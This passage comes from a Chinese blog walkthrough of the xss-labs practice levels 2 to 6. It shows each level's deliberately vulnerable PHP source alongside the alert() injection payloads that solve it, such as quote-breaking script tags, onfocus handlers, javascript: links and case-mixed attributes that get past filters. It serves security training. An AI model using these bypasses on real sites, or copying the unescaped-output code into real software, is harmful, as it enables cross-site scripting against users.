align=center>没有找到和\"</span><span class=\"token operator\">.</span><span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"相关的结果.&lt;/h2>\"</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&lt;center></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>&lt;form action=level2.php method=GET></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>&lt;input name=keyword  value=\"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$str</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\"></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>&lt;input type=submit name=submit value=\"搜索\"/></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>&lt;/form></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>&lt;/center>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>level2.png</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>center</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h3 align=center>payload的长度:\"</span><span class=\"token operator\">.</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;/h3>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>用htmlspecialchars对用户输入的预定义的字符转换为HTML实体</pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/a.png\" alt=\"\"></p>\n<p>&lt;&gt; 被转义了导致无法执行语句弹窗</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/b.png\" alt=\"\"></p>\n<p>而 input 也被写入了语句并且没有进行转义，可以在这里闭合 input 就可以执行语句了</p>\n<p><code>payload: &quot;&gt; &lt;script&gt;alert(1)&lt;/script&gt;</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/5.png\" alt=\"\"></p>\n<h4 id=\"第三题\"><a class=\"markdownIt-Anchor\" href=\"#第三题\">#</a> <span class=\"label\">第三题</span></h4>\n<p>输入上关语句无效了</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/6.png\" alt=\"\"></p>\n<p>查看源代码对两处都用 htmlspecialchars 函数处理了无法闭合了，可以使用’ autofocus onfocus=alert (666) ' 事件触发型的语句</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span><span class=\"token comment\">&lt;!--STATUS OK--></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>content-type<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/html;charset=utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  window<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">alert</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span>     </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">confirm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"完成的不错！\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href<span class=\"token operator\">=</span><span class=\"token string\">\"level4.php?keyword=try harder!\"</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>欢迎来到level3<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span> <span class=\"token attr-name\">align</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>center</span><span class=\"token punctuation\">></span></span>欢迎来到level3<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"display_errors\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"keyword\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h2 align=center>没有找到和\"</span><span class=\"token operator\">.</span><span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span>被处理<span class=\"token string double-quoted-string\">\"相关的结果.&lt;/h2>\"</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;center></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>&lt;form action=level3.php method=GET></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>&lt;input name=keyword  value='\"</span><span class=\"token operator\">.</span><span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"'>\t被处理</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>&lt;input type=submit name=submit value=搜索 /></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>&lt;/form></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>&lt;/center>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>level3.png</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>center</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h3 align=center>payload的长度:\"</span><span class=\"token operator\">.</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;/h3>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/7.png\" alt=\"\"></p>\n<h4 id=\"第四关\"><a class=\"markdownIt-Anchor\" href=\"#第四关\">#</a> <span class=\"label\">第四关</span></h4>\n<p>和第三关一样不过这关用双引号闭合</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/8.png\" alt=\"\"></p>\n<p><span class=\"label\">👁代码分析</span></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span><span class=\"token comment\">&lt;!--STATUS OK--></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>content-type<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/html;charset=utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>window<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">alert</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span>     </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">confirm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"完成的不错！\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href<span class=\"token operator\">=</span><span class=\"token string\">\"level5.php?keyword=find a way out!\"</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>欢迎来到level4<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span> <span class=\"token attr-name\">align</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>center</span><span class=\"token punctuation\">></span></span>欢迎来到level4<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"display_errors\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"keyword\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token variable\">$str2</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\">\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token variable\">$str3</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">&lt;</span>被转换为空</pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h2 align=center>没有找到和\"</span><span class=\"token operator\">.</span><span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"相关的结果.&lt;/h2>\"</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&lt;center></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>&lt;form action=level4.php method=GET></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>&lt;input name=keyword  value=\"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$str3</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\"> 双引号包裹</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>&lt;input type=submit name=submit value=搜索 /></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>&lt;/form></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>&lt;/center>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>level4.png</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>center</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h3 align=center>payload的长度:\"</span><span class=\"token operator\">.</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str3</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;/h3>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>&lt; &gt; 被转换为空了</p>\n<h4 id=\"第五关\"><a class=\"markdownIt-Anchor\" href=\"#第五关\">#</a> <span class=\"label\">第五关</span></h4>\n<p>scrinpt 被替换了 但是 &lt;&gt; 没有被处理</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/9.png\" alt=\"\"></p>\n<p><code>可以用其他标签代替&quot;&gt;&lt;ahref=&quot;javascript:alert(1);&quot;&gt;xss&lt;/a&gt;</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/10.png\" alt=\"\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/11.png\" alt=\"\"></p>\n<p>添加一个 a 标签内容弹窗点击触发弹窗</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/12.png\" alt=\"\"></p>\n<p><span class=\"label\">👁代码分析</span></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span><span class=\"token comment\">&lt;!--STATUS OK--></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>content-type<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/html;charset=utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>window<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">alert</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span>     </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">confirm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"完成的不错！\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href<span class=\"token operator\">=</span><span class=\"token string\">\"level6.php?keyword=break it out!\"</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>欢迎来到level5<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span> <span class=\"token attr-name\">align</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>center</span><span class=\"token punctuation\">></span></span>欢迎来到level5<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"display_errors\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token function\">strtolower</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"keyword\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token variable\">$str2</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;script\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"&lt;scr_ipt\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token variable\">$str3</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"on\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"o_n\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h2 align=center>没有找到和\"</span><span class=\"token operator\">.</span><span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"相关的结果.&lt;/h2>\"</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&lt;center></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>&lt;form action=level5.php method=GET></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>&lt;input name=keyword  value=\"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$str3</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\"></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>&lt;input type=submit name=submit value=搜索 /></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>&lt;/form></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>&lt;/center>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>level5.png</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>center</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h3 align=center>payload的长度:\"</span><span class=\"token operator\">.</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str3</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;/h3>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>把&lt;script 和on 替换为&lt;scr_ipt o_n 所以不可用</pre></td></tr></table></figure><h4 id=\"第六关\"><a class=\"markdownIt-Anchor\" href=\"#第六关\">#</a> <span class=\"label\">第六关</span></h4>\n<p>输入 &quot;&gt;&lt;ahref=“javascript:alert (1);”&gt;xss</a></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/13.png\" alt=\"\"></p>\n<p>href 被过滤了可以尝试一下把 href 写成大小写 hREf</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/14.png\" 